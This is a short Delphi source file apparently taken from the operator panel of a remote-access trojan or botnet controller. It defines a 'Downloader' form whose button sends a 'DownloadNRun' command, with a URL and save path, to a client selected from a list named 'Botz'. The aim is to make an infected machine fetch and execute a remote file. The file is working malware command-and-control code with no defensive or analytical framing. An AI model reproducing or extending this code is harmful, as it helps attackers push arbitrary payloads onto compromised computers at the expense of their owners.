unit UDownloader;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls;

type
  TForm3 = class(TForm)
    GroupBox1: TGroupBox;
    Button1: TButton;
    Label2: TLabel;
    Label1: TLabel;
    EdtPath: TEdit;
    EdtUrl: TEdit;
    procedure Button1Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form3: TForm3;

implementation

{$R *.dfm}

uses UMian;

procedure TForm3.Button1Click(Sender: TObject);
begin
form1.TCPServerSendStr('DownloadNRun|' + EdtUrl.Text + '|' + EdtPath.Text,strtoint(form1.Botz.Selected.Caption));
sleep(100);
form3.Close;
end;



end.
